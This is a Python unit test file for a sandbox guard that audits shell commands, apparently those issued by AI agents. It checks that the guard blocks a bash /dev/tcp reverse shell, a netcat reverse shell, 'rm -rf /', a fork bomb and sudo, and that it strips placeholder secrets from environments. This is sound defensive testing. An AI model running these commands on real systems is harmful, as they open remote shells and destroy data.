"""Unit tests for SubprocessInterceptor."""

import os
import pytest
from agent_sandbox_guard.subprocess_interceptor import SubprocessInterceptor
from agent_sandbox_guard.types import SandboxPolicy, ViolationSeverity


def test_tokenize_clean_string():
    tokens = SubprocessInterceptor.tokenize("ls -la /tmp")
    assert tokens == ["ls", "-la", "/tmp"]


def test_tokenize_malformed_string():
    with pytest.raises(ValueError):
        SubprocessInterceptor.tokenize('echo "unclosed quote')


def test_subprocess_disabled_by_policy():
    policy = SandboxPolicy(allow_subprocesses=False)
    is_safe, tokens, violations = SubprocessInterceptor.audit_command("ls", policy)
    assert is_safe is False
    assert any(v.category == "SUBPROCESS_BLOCKED" for v in violations)


def test_reverse_shell_detection():
    policy = SandboxPolicy()
    cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    is_safe, tokens, violations = SubprocessInterceptor.audit_command(cmd, policy)
    assert is_safe is False
    assert any(v.category == "REVERSE_SHELL_DETECTED" for v in violations)


def test_netcat_reverse_shell():
    policy = SandboxPolicy()
    cmd = "nc -e /bin/sh 192.168.1.50 9001"
    is_safe, tokens, violations = SubprocessInterceptor.audit_command(cmd, policy)
    assert is_safe is False
    assert any(v.category in ("REVERSE_SHELL_DETECTED", "FORBIDDEN_BINARY_EXECUTION") for v in violations)


def test_catastrophic_destruction_rm_root():
    policy = SandboxPolicy()
    cmd = "rm -rf /"
    is_safe, tokens, violations = SubprocessInterceptor.audit_command(cmd, policy)
    assert is_safe is False
    assert any(v.category == "CATASTROPHIC_DESTRUCTION" for v in violations)


def test_fork_bomb():
    policy = SandboxPolicy()
    cmd = ":(){ :|:& };:"
    is_safe, tokens, violations = SubprocessInterceptor.audit_command(cmd, policy)
    assert is_safe is False
    assert any(v.category == "CATASTROPHIC_DESTRUCTION" for v in violations)


def test_forbidden_binary_sudo():
    policy = SandboxPolicy()
    cmd = "sudo apt-get install evil"
    is_safe, tokens, violations = SubprocessInterceptor.audit_command(cmd, policy)
    assert is_safe is False
    assert any(v.category == "FORBIDDEN_BINARY_EXECUTION" for v in violations)


def test_allowed_commands_whitelist():
    policy = SandboxPolicy(allowed_commands=["python3", "git"])
    is_safe, tokens, violations = SubprocessInterceptor.audit_command("python3 --version", policy)
    assert is_safe is True
    assert len(violations) == 0

    is_safe, tokens, violations = SubprocessInterceptor.audit_command("curl https://example.com", policy)
    assert is_safe is False
    assert any(v.category == "UNAUTHORIZED_BINARY_EXECUTION" for v in violations)


def test_sanitize_environment():
    policy = SandboxPolicy()
    dirty_env = {
        "PATH": "/usr/bin:/bin",
        "USER": "developer",
        "OPENAI_API_KEY": "sk-secret123456789",
        "AWS_SECRET_ACCESS_KEY": "aws-secret-xyz",
        "GITHUB_TOKEN": "ghp_supersecret",
        "DATABASE_PASSWORD": "dbpassword123",
    }
    clean = SubprocessInterceptor.sanitize_environment(dirty_env, policy)
    assert "PATH" in clean
    assert "USER" in clean
    assert "OPENAI_API_KEY" not in clean
    assert "AWS_SECRET_ACCESS_KEY" not in clean
    assert "GITHUB_TOKEN" not in clean
    assert "DATABASE_PASSWORD" not in clean
